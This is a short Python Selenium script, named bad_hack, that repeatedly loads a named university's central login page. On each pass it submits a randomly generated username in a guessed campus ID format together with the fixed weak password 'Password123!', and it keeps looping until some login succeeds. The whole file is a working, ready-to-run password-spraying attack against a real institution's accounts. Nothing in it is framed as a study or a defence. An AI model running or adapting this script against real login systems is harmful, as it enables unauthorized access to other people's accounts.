from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import os
import string
import random


def get_random_string():
    letters = ''.join(random.choice(string.ascii_lowercase) for _ in range(3))
    numbers = ''.join(random.choice(string.digits) for _ in range(5))
    return letters + numbers
    # assume username to be of length 8
    # 3 letters and 5 numbers (if middle name)
    # or 2 letters 6 numbers (else)


def get_really_bad_password():
    return "Password123!"


def bad_hack():
    root_dir = os.getcwd()
    utils_dir = os.path.abspath(root_dir + "/../utils/")
    driver = webdriver.Chrome(executable_path=utils_dir + '/chromedriver')

    csun_url = "https://auth.csun.edu/cas/login"
    current_url = csun_url

    while current_url == csun_url:
        driver.get(csun_url)

        username_input = driver.find_element_by_id('username')
        username_input.send_keys(get_random_string())

        password_input = driver.find_element_by_id('password')
        password_input.send_keys(get_really_bad_password())

        username_input.send_keys(Keys.ENTER)

    driver.quit()


if __name__ == '__main__':
    bad_hack()
